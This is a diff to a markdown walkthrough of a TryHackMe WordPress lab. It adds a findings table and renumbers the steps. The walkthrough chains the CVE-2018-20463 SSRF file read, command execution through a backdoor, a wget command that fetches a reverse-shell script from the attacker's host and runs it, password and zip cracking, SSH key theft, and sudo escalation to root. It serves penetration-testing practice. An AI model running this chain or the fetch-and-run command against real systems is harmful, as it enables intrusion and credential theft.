@@ -1,3 +1,18 @@
+| # | Finding | Severity | Root cause | Fix |
+|---|---------|----------|------------|-----|
+| 1 | SSRF / file read in jsmol2wp (CVE-2018-20463) | High | Vulnerable plugin | Remove or update the plugin |
+| 2 | RCE via backdoor in hello.php | Critical | Malicious code left on the server | Remove it and audit the codebase |
+| 3 | Credentials in wp-config / old backup zip | High | Secrets stored in readable files | Keep backups off the webroot and rotate creds |
+| 4 | Weak password on the zip | Medium | Crackable with rockyou | Use strong passphrases |
+| 5 | Password reuse across users | High | No credential hygiene | Unique passwords and MFA |
+| 6 | Unrestricted sudo | Critical | Over-privileged user | Least privilege |
+
+
+
+
+
+
+
 # This is a Medium Level Tryhackme Lab, Where we exploit a wordpress website which is vulnerable to SSRF(Server Side Request Forgery) that is marked CVE-2018-20463. which allow   us  to read any file on the server . then we Get a foothold  and start to Lateral Move from user to user until we Reach root.
 
 
@@ -31,6 +46,8 @@ ap- all plugins
 ##
 
 # 4- It found a Plugin called jsmol2wp. i started searching for CVES about it and found one which is. Which is SSRF TO file Read.
+why did we choose jsmol2sp? because its the only one that came out in the wpscan output, and is vulnerable to  (CVE-2018-20463)
+
 <img width="935" height="242" alt="Screenshot 2026-11-18 005406" src="https://github.com/user-attachments/assets/e7d3f7d9-74f5-49c8-9c97-0597840052d9" />
 
 
@@ -58,6 +75,8 @@ https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-20
 <img width="1917" height="941" alt="Screenshot 2026-11-18 010206" src="https://github.com/user-attachments/assets/c3c684c8-f79a-4d75-b933-434722ec0a50" />
 
 ##
+
+
 # 8 - it is hinting that there is a file somewhere on the server i used the same payload we used above which is given below but instead of the config file i tried some names like doll.php,hello.php,hellodoll.php,dollhello.php. Only 1 worked out which is hello.php
 
 ```
@@ -69,21 +88,23 @@ http://localhost/wp-content/plugins/jsmol2wp/php/jsmol.php
 <img width="1917" height="736" alt="Screenshot 2026-11-18 010233" src="https://github.com/user-attachments/assets/ab75fb1e-01eb-4423-b1a9-f42b2439e947" />
 
 
-# 8 - i decoded the base64 encoded line and got this, it is hinting for a cmd parameter abuse .
+# 9 - i decoded the base64 encoded line and got this, it is hinting for a cmd parameter abuse .
 <img width="1862" height="207" alt="Screenshot 2026-11-18 010256" src="https://github.com/user-attachments/assets/4bf4671d-984e-4ed5-b821-03724fe699d0" />
  ##
  
-# 9 - I injected ?cmd=id and boom we have code execution is on 
+# 10 - I injected ?cmd=id and boom we have code execution is on 
 <img width="1917" height="842" alt="Screenshot 2026-11-18 010433" src="https://github.com/user-attachments/assets/0aa4afd5-8332-4982-a529-72546d8b3b4d" />
+
 ##
 
-# 10 - I injected a reverse shell but there was a firewall blocking me, Then i tried to encode it to bypass the filter but still did not get lucky 
+
+# 11 - I injected a reverse shell but there was a firewall blocking me, Then i tried to encode it to bypass the filter but still did not get lucky 
 <img width="1917" height="912" alt="Screenshot 2026-11-18 011721" src="https://github.com/user-attachments/assets/143e6556-9e19-4985-b0bc-8adedf9c4b3e" />
 
 <img width="1862" height="645" alt="Screenshot 2026-11-18 011637" src="https://github.com/user-attachments/assets/651f175e-e03b-4dbc-bbb3-9d14a3335b08" />
 
 ## 
-# 11 - After trying bypass fitler techniques i came across file shell upload. we upload a reverse shell and execute it from the cmd parameter.
+# 12 - After trying bypass fitler techniques i came across file shell upload. we upload a reverse shell and execute it from the cmd parameter.
 Started a python server to upload the reverse shell
 <img width="1876" height="668" alt="Screenshot 2026-11-18 011927" src="https://github.com/user-attachments/assets/759211b0-7688-43c0-adc7-8206f6513fba" />
 Then used the command 
@@ -95,10 +116,10 @@ wget http://ipadrrr:portnumber/file.sh -O /tmp/shell.sh
 <img width="1917" height="916" alt="Screenshot 2026-11-18 011941" src="https://github.com/user-attachments/assets/cda84ce1-654d-49f0-b711-1cf168e83241" />
 ##
 
-# 12 - We got this message on our machine which means file is uploaded on the server successfully, 
+# 13 - We got this message on our machine which means file is uploaded on the server successfully, 
 <img width="1871" height="650" alt="Screenshot 2026-11-18 011959" src="https://github.com/user-attachments/assets/028c7174-5d37-480e-93aa-16fcf14529f4" />
 
-# 13 - Time to execute the shell 
+# 14 -  executing the script 
 ```
 bash /tmp/file.sh
 ```
@@ -107,54 +128,56 @@ bash /tmp/file.sh
 <img width="1881" height="671" alt="Screenshot 2026-11-18 013434" src="https://github.com/user-attachments/assets/3adef812-2942-4984-987b-485035b5e760" />
 
 ##
-# 14 - We got a foothold time to enumerate for privilege escalation, i tried tranferring and using linpeas but gave me false positive flags, and no suid binaries i ran "ps aux" and i found a mysql server running i used wpuser credentials 
+# 15 - We got a foothold time to enumerate for privilege escalation, i tried tranferring and using linpeas but gave me false positive flags, and no suid binaries i ran "ps aux" and i found a mysql server running i used wpuser credentials 
 <img width="1152" height="617" alt="Screenshot 2026-11-18 013543" src="https://github.com/user-attachments/assets/283ece2c-955d-4d9b-8c73-0ad53bca6213" />
 
 <img width="1100" height="260" alt="image" src="https://github.com/user-attachments/assets/39b886bd-cdc0-4a02-97ac-82f46474f809" />
 
 
-# 15 - I took diego hashed password and tried to crack the hashed password using johntheripper tool 
+# 16 - I took diego hashed password and tried to crack the hashed password using johntheripper tool 
 <img width="1856" height="658" alt="Screenshot 2026-11-18 015823" src="https://github.com/user-attachments/assets/b9cac26c-a951-4650-b060-8f75e14bb379" />
 
-# 16 - i switched to diego and diego can access the user "think" directory and from there we find a .ssh which we take the id_rsa of think and login via ssh
+# 17 - i switched to diego and diego can access the user "think" directory and from there we find a .ssh which we take the id_rsa of think and login via ssh
 
 <img width="1871" height="667" alt="Screenshot 2026-11-18 015944" src="https://github.com/user-attachments/assets/3e43b369-87a3-420f-8f72-c06ea5faebb3" />
 
-# 17 - i logged in as think, and to search for anything that could help me i found a file called wordpress.old.zip which we dont permission to unzip. then i came to a point to start a python server on the comprised machine and transfer the zip file and brute force it offline.
+# 18 - i logged in as think, and to search for anything that could help me i found a file called wordpress.old.zip which we dont permission to unzip. then i came to a point to start a python server on the comprised machine and transfer the zip file and brute force it offline.
 then now we can brute force it using the command below
 ```
 zip2john wordpress.old.zip > hash.txt
 ```
 <img width="1867" height="658" alt="image" src="https://github.com/user-attachments/assets/8f02ce62-2d86-4e85-a99e-f6b9fc4457ef" />
 ##
-# 18 -  then i brute forced it using the command 
+# 19 -  then i brute forced it using the command 
 ```
 john --format=phpass --wordlist=path/to/rockyou.txt hash.txt
 ```
 NOTE: u should take the hash till index.php file which as shwon in the screenshot 
 <img width="1846" height="288" alt="image" src="https://github.com/user-attachments/assets/fb666d97-a05d-4429-9984-c3ce4f791678" />
 
-# 19 - john cracked the hash for us which is, and then i unzipped it 
+# 20 - john cracked the hash for us which is, and then i unzipped it 
 <img width="1862" height="653" alt="image" src="https://github.com/user-attachments/assets/7e4ccf9b-a330-462d-8242-7449f508e3dd" />
 <img width="1867" height="657" alt="image" src="https://github.com/user-attachments/assets/8c314553-af48-4d98-848b-8c9b596d60e3" />
 
 
 ##
 
-# 20 - after unzipping the files i looked inside wp-admin, wp-login.php, forgot to look inside wp-conifg.php, which then i looked at and found xavi credentials sitting there
+# 21 - after unzipping the files i looked inside wp-admin, wp-login.php, forgot to look inside wp-conifg.php, which then i looked at and found xavi credentials sitting there
 <img width="1857" height="641" alt="image" src="https://github.com/user-attachments/assets/be23bb8e-64a4-4118-befb-3f1929d67150" />
 
 ##
-# 21 - i switch user to xavi using "su xavi" then ran sudo -l to see what are things i can do and boom we can do everything 
+
+# 22 - i switch user to xavi using "su xavi" then ran sudo -l to see what are things i can do and boom we can do everything 
 <img width="1867" height="204" alt="Screenshot 2026-11-18 021320" src="https://github.com/user-attachments/assets/56838984-4aea-4b0a-8565-7dac47622f5f" />
 
 ##
-# 22 - i used the command "sudo /bin/bash" this spawns me a root shell.  then i looked for user.txt file which was sitting in diego directory, and the root file which was in the root directory. 
+
+# 23 - i used the command "sudo /bin/bash" this spawns me a root shell.  then i looked for user.txt file which was sitting in diego directory, and the root file which was in the root directory. 
 <img width="1871" height="661" alt="image" src="https://github.com/user-attachments/assets/f9a83241-54f2-437e-997a-2474d9e00831" />
 <img width="1866" height="642" alt="Screenshot 2026-11-18 134848" src="https://github.com/user-attachments/assets/81ef9af9-a5ec-486e-b5e6-175f90b7261d" />
 
 
-## Make Sure to Star the repo if you understood the writeup.
+
 
 
 
